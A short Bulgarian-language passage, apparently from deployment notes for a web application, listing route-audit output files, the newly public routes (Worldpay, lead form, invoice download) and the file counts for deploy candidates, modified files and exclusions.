- `routes-clean.json`, `public-routes.txt`, `route-names.txt`: `route:list` (150 маршрута без `auth`; новите публични са Worldpay ×7, `invoice-worldpay/worldpay-modal`, `lead-form/{hash}/{slug?}`, `invoice/download/{hash}`).
- `names.txt`, `deploy-candidates.txt` (411), `modified-to-deploy.txt` (294), `exclude.txt` (35).
